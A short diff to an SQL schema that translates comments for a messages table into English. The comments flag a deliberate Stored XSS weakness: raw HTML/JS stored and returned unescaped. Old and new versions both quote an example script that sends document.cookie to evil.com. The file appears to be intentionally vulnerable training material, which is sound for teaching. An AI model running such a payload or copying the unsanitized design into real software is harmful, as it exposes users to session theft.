@@ -1,6 +1,6 @@
--- [A05] Security Misconfiguration / XSS: content kolona prihvata sirovi HTML/JS bez sanitizacije.
--- Poruke se pohranjuju i prikazuju bez escaping-a, što omogućava Stored XSS napad
--- (npr. content = '<script>document.location="https://evil.com?c="+document.cookie</script>').
+-- [A05] Security Misconfiguration / XSS: content column accepts raw HTML/JS without sanitization.
+-- Messages are stored and returned without escaping, enabling Stored XSS attacks
+-- (e.g. content = '<script>document.location="https://evil.com?c="+document.cookie</script>').
 CREATE TABLE messages (
     id          BIGINT    PRIMARY KEY AUTO_INCREMENT,
     sender_id   BIGINT    NOT NULL,
